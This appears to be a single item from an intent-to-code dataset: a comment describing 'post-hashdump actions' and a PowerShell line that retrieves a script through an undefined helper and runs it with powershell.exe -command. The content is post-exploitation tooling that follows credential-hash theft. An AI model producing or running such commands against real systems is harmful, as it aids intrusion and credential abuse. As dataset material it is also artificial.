# Natural language intent:
# Retrieve a PowerShell script for post-hashdump actions and execute it.

$enc = Get-PostHashdumpScript ; powershell.exe -command $enc
